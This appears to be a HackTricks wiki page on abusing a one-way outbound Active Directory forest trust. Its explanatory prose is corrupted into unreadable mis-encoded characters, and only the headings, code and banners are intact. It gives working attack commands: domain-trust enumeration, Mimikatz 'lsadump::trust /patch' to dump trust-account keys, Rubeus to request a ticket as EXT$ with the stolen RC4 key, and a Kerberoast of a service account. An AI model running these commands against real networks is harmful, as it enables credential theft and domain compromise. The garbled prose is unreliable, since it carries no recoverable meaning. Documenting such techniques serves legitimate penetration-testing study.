# External Forest Domain - One-Way (Outbound)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ **рдЖрдкрдХрд╛ рдбреЛрдореЗрди** рдХреБрдЫ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдХреЛ **рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди** рд╕реЗ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ **рд╡рд┐рд╢реНрд╡рд╛рд╕** рдХрд░ рд░рд╣рд╛ рд╣реИред

## Enumeration

### Outbound Trust
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рддрдм рд╣реЛрддреА рд╣реИ рдЬрдм рджреЛ рдбреЛрдореЗрди рдХреЗ рдмреАрдЪ рдПрдХ рдЯреНрд░рд╕реНрдЯ рд╕рдВрдмрдВрдз рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдпрд╣рд╛рдБ рдбреЛрдореЗрди **A** рдФрд░ рдбреЛрдореЗрди **B** рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣рдЪрд╛рдирд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд╣рд╛рдБ рдбреЛрдореЗрди **B** рдЕрдкрдиреЗ рдЯреНрд░рд╕реНрдЯ рдХреЛ рдбреЛрдореЗрди **A** рддрдХ рдмрдврд╝рд╛рддрд╛ рд╣реИред рдЗрд╕ рд╕реЗрдЯрдЕрдк рдореЗрдВ, рдбреЛрдореЗрди **B** рдХреЗ рд▓рд┐рдП рдбреЛрдореЗрди **A** рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЦрд╛рддрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рджреЛрдиреЛрдВ рдбреЛрдореЗрди рдХреЗ рдмреАрдЪ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИред рдпрд╣ рдЦрд╛рддрд╛, рдЬреЛ рдбреЛрдореЗрди **B** рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ, рдбреЛрдореЗрди рдХреЗ рдмреАрдЪ рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЯрд┐рдХрдЯреЛрдВ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рд╣реИрд╢ рдбреЛрдореЗрди **A** рдореЗрдВ рдПрдХ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдПрдХ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб рд╣реИ:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
рдпрд╣ рдирд┐рд╖реНрдХрд░реНрд╖рдг рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЦрд╛рддрд╛, рдЬрд┐рд╕рдХреЗ рдирд╛рдо рдХреЗ рдмрд╛рдж **$** рд╣реИ, рд╕рдХреНрд░рд┐рдп рд╣реИ рдФрд░ рдбреЛрдореЗрди **A** рдХреЗ "рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ" рд╕рдореВрд╣ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЗрд╕ рд╕рдореВрд╣ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓рддреА рд╣реИрдВред рдпрд╣ рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдЗрд╕ рдЦрд╛рддреЗ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди **A** рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

**рдЪреЗрддрд╛рд╡рдиреА:** рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдбреЛрдореЗрди **A** рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдкреИрд░ рдЬрдорд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕реАрдорд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рдеред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдкрд╣реБрдБрдЪ рдбреЛрдореЗрди **A** рдкрд░ рдПрдиреНрдпреВрдорд░реЗрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред

рдПрдХ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ рдЬрд╣рд╛рдБ `ext.local` рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЛрдореЗрди рд╣реИ рдФрд░ `root.local` рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЛрдореЗрди рд╣реИ, `root.local` рдХреЗ рднреАрддрд░ `EXT$` рдирд╛рдо рдХрд╛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, Kerberos рдЯреНрд░рд╕реНрдЯ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рдбрдВрдк рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЬреЛ `root.local` рдореЗрдВ `EXT$` рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрджреЗрд╢ рд╣реИ:
```bash
lsadump::trust /patch
```
рдЗрд╕рдХреЗ рдмрд╛рдж, рдХреЛрдИ рдирд┐рдХрд╛рд▓реЗ рдЧрдП RC4 рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `root.local` рдХреЗ рднреАрддрд░ `root.local\EXT$` рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдПрдХ рдЕрдиреНрдп рдЙрдкрдХрд░рдг рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
рдпрд╣ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪрд░рдг `root.local` рдХреЗ рднреАрддрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдЦреЛрд▓рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП Kerberoast рд╣рдорд▓реЗ рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд░рдирд╛:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдЯреНрд░рд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдПрдХрддреНрд░ рдХрд░рдирд╛

рдкрд┐рдЫрд▓реЗ рдкреНрд░рд╡рд╛рд╣ рдореЗрдВ **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб** рдХреЗ рдмрдЬрд╛рдп рдЯреНрд░рд╕реНрдЯ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ (рдЬреЛ рдХрд┐ **mimikatz рджреНрд╡рд╛рд░рд╛ рднреА рдбрдВрдк рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**).

рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ mimikatz рд╕реЗ \[ CLEAR ] рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдХреЗ рдФрд░ рдирд▓ рдмрд╛рдЗрдЯреНрд╕ тАШ\x00тАЩ рдХреЛ рд╣рдЯрд╛рдХрд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (938).png>)

рдХрднреА-рдХрднреА рдЯреНрд░рд╕реНрдЯ рд╕рдВрдмрдВрдз рдмрдирд╛рддреЗ рд╕рдордп, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЯреНрд░рд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рдЯрд╛рдЗрдк рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рджрд░реНрд╢рди рдореЗрдВ, рдХреБрдВрдЬреА рдореВрд▓ рдЯреНрд░рд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИ рдФрд░ рдЗрд╕рд▓рд┐рдП рдорд╛рдирд╡ рдкрдардиреАрдп рд╣реИред рдЬреИрд╕реЗ-рдЬреИрд╕реЗ рдХреБрдВрдЬреА рдЪрдХреНрд░рд┐рдд рд╣реЛрддреА рд╣реИ (30 рджрд┐рди), рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдорд╛рдирд╡-рдкрдардиреАрдп рдирд╣реАрдВ рд╣реЛрдЧрд╛ рд▓реЗрдХрд┐рди рддрдХрдиреАрдХреА рд░реВрдк рд╕реЗ рдЕрднреА рднреА рдЙрдкрдпреЛрдЧреА рд░рд╣реЗрдЧрд╛ред

рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреНрд░рд╕реНрдЯ рдЦрд╛рддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рдпрдорд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдЯреНрд░рд╕реНрдЯ рдЦрд╛рддреЗ рдХреЗ рдХреЗрд░реНрдмреЗрд░реЛрд╕ рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ TGT рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реИред рдпрд╣рд╛рдБ, ext.local рд╕реЗ root.local рдХреЗ рд▓рд┐рдП рдбреЛрдореЗрди рдПрдбрдорд┐рдиреНрд╕ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХрд╛ рдкреНрд░рд╢реНрди рдкреВрдЫрдирд╛:

![](<../../.gitbook/assets/image (792).png>)

## рд╕рдВрджрд░реНрдн

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
